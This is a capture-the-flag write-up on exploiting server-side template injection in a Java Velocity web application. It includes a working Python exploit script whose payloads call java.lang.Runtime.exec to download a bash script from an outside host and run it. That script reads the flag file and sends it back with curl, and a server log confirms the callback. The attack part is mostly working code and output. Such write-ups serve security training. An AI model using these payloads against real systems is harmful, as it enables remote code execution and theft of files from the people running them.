# [Web - easy] Labyrinth Linguist

This challenge consists in a Java web application. Through it we can input some text from a form to translate it into `voxalith`.

Going deeper into the Java code, the template stands out. Especially the library `org.apache.velocity` is used for templating. This calls for [SSTI](https://antgarsil.github.io/posts/velocity/).

```bash
$ grep velocity -A1 pom.xml
      <groupId>org.apache.velocity</groupId>
      <artifactId>velocity</artifactId>
      <version>1.7</version>
```

```bash
$ cat resources/templates/index.html
[...]
<form class="fire-form" action="" method="post">
        <span class="fire-form-text">Enter text to translate english to voxalith!</span><br><br>
        <input class="fire-form-input" type="text" name="text" value="">
        <input class="fire-form-button" type="submit" value="Submit →">
    </form>
    <h2 class="fire">TEXT</h2>
[...]
```

```java
import org.apache.velocity.VelocityContext;
import org.apache.velocity.runtime.RuntimeServices;
import org.apache.velocity.runtime.RuntimeSingleton;
import org.apache.velocity.runtime.parser.ParseException;
[...]
	String index(@RequestParam(required = false, name = "text") String textString) {
		if (textString == null) {
			textString = "Example text";
		}
[...]
            template = readFileToString("/app/src/main/resources/templates/index.html", textString);
[...]
		org.apache.velocity.Template t = new org.apache.velocity.Template();
[...]
		return template;
	}

	public static String readFileToString(String filePath, String replacement) throws IOException {
[...]
                line = line.replace("TEXT", replacement);
                content.append(line);
                content.append("\n");
        return content.toString();
    }
}
```

After some research on a payload that can execute code, I ended up on this [piece of code](https://github.com/JoyChou93/java-sec-code/blob/master/src/main/java/org/joychou/controller/SSTI.java), with a useful comment:

```java
public class SSTI {

    /**
     * SSTI of Java velocity. The latest Velocity version still has this problem.
     * Fix method: Avoid to use Velocity.evaluate method.
     * p
     * http://localhost:8080/ssti/velocity?template=%23set($e=%22e%22);$e.getClass().forName(%22java.lang.Runtime%22).getMethod(%22getRuntime%22,null).invoke(null,null).exec(%22open%20-a%20Calculator%22)
     * Open a calculator in MacOS.
```

Trying this payload leads to good results. We can then extract the flag value by using `curl` to send it to a remote HTTP server

```python
import requests
import re
url = "http://83.136.253.168:58982"
payloads = [
    '#set($e="lol");#set($ex=$e.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("curl -so /tmp/script http://1.2.3.4:4444/script"))',
    # need to wait between, or do it twice to ensure script is already downloaded
    '#set($e="lol");#set($ex=$e.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("bash /tmp/script"))',
    ]
for payload in payloads:
    exploit = {
        "text": payload
    }
    response = requests.post(url, data = exploit)
    matches = re.findall(r'<h2 class="fire">(.*)</h2>', response.text)
    if len(matches) != 0:
        print(matches[0])
    else:
        print(response.text)
```

It downloads another bash script from the HTTP remote server into `/tmp` and executes it with `bash`

```bash
pi@raspberrypi:/tmp/lol $ cat script
flag=$(cat /flag*.txt)
curl http://1.2.3.4:4444/?flag=$flag
```

Executing the python script, we see the remote bash script downloaded and the callback received. It contains the flag

```bash
pi@raspberrypi:/tmp/lol $ python -m http.server 4444
Serving HTTP on 0.0.0.0 port 4444 (http://0.0.0.0:4444/) ...
83.136.253.168 - - [14/Mar/2024 03:14:21] "GET /script HTTP/1.1" 200 -
83.136.253.168 - - [14/Mar/2024 03:14:27] "GET /script HTTP/1.1" 200 -
83.136.253.168 - - [14/Mar/2024 03:14:27] "GET /?flag=HTBf13ry_t3mpl4t35_fr0m_th3_d3pth5!! HTTP/1.1" 200 -
```